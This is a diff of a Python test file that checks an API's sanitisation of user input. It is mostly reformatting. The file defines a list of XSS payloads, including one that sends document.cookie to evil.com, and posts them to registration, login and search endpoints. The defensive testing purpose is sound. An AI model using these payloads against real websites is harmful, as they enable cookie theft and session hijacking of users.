@@ -4,9 +4,9 @@ Verifies that all user-supplied input is sanitized before storage/response.
 The gateway uses Pydantic field validators with sanitize_html() on all
 text fields to strip dangerous HTML tags and event handlers.
 """
+
 import uuid
 from datetime import datetime, timezone
-from unittest.mock import AsyncMock
 
 import pytest
 
@@ -17,10 +17,10 @@ from .conftest import client, raw_client, mock_db_no_user  # noqa: F401
 
 XSS_PAYLOADS = [
     '<script>alert("xss")</script>',
-    '<img src=x onerror=alert(1)>',
-    '<svg onload=alert(1)>',
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
     '<iframe src="javascript:alert(1)"></iframe>',
-    '<body onload=alert(1)>',
+    "<body onload=alert(1)>",
     '"><script>document.location="http://evil.com/"+document.cookie</script>',
     "javascript:alert(document.cookie)",
     '<embed src="data:text/html,<script>alert(1)</script>">',
@@ -52,11 +52,14 @@ class TestXSSInRegistration:
 
         app.dependency_overrides[get_db] = override_db
         try:
-            response = await raw_client.post("/api/v1/auth/register", json={
-                "email": f"xss-{uuid.uuid4().hex[:8]}@test.com",
-                "password": "SecurePass1",
-                "full_name": f"{payload} Safe Name",
-            })
+            response = await raw_client.post(
+                "/api/v1/auth/register",
+                json={
+                    "email": f"xss-{uuid.uuid4().hex[:8]}@test.com",
+                    "password": "SecurePass1",
+                    "full_name": f"{payload} Safe Name",
+                },
+            )
             if response.status_code == 201:
                 data = response.json()
                 assert "<script>" not in data.get("full_name", "")
@@ -80,10 +83,13 @@ class TestXSSInRegistration:
 
         app.dependency_overrides[get_db] = override_db
         try:
-            response = await raw_client.post("/api/v1/auth/login", json={
-                "email": '<script>alert(1)</script>@test.com',
-                "password": "TestPass1",
-            })
+            response = await raw_client.post(
+                "/api/v1/auth/login",
+                json={
+                    "email": "<script>alert(1)</script>@test.com",
+                    "password": "TestPass1",
+                },
+            )
             # Should fail validation or auth, never execute script
             assert response.status_code in (401, 422)
             assert "<script>" not in response.text
@@ -101,7 +107,12 @@ class TestXSSInSearch:
 
         response = await client.post(
             "/api/v1/search",
-            json={"query": payload, "search_type": "keyword", "page": 1, "page_size": 20},
+            json={
+                "query": payload,
+                "search_type": "keyword",
+                "page": 1,
+                "page_size": 20,
+            },
             headers=auth_headers(),
         )
         # Even if search service is down (502), the response should not contain raw XSS
